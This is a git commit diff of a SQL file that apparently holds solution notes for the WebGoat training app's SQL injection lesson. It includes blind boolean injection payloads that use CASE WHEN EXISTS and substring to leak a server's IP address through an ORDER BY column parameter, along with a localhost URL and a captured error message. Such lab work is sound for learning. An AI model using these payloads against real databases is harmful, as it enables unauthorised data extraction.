ed0d3bb19237406af47c105db56798abdc75c361
Th3Dilli <dilli.1822@gmx.at>
2019-01-06 19:40:27 +0100

    changed injection query

--- sql_Demo/WebGoatSQL.sql
+++ sql_Demo/WebGoatSQL.sql
@@ -1,10 +1,10 @@
 -- http link to the site with the completed injection
--- http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when exists(select substring(ip,1,15) from servers where hostname = 'webgoat-prd' AND substring(ip,1,15) = '104.130.219.202' ) then hostname else ip end)
+-- http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when exists(select ip from servers where hostname = 'webgoat-prd' AND substring(ip,1,15) = '104.130.219.202' ) then hostname else ip end)
 
 
 
 -- sql injection for column
-case when exists(select substring(ip,1,1) from servers where hostname = 'webgoat-prd' AND substring(ip,1,1) = '1' ) then hostname else ip end
+case when exists(select ip from servers where hostname = 'webgoat-prd' AND substring(ip,1,1) = '1' ) then hostname else ip end
 
 
 
@@ -12,8 +12,7 @@ case when exists(select substring(ip,1,1) from servers where hostname = 'webgoat
 -- Server Response with the query when query failed
 
 -- user lacks privilege or object not found: TABLENAME in statement 
--- [select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#39;out of order&#39; order by tablename]
-
+ select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#39;out of order&#39; order by tablename
 
 
 
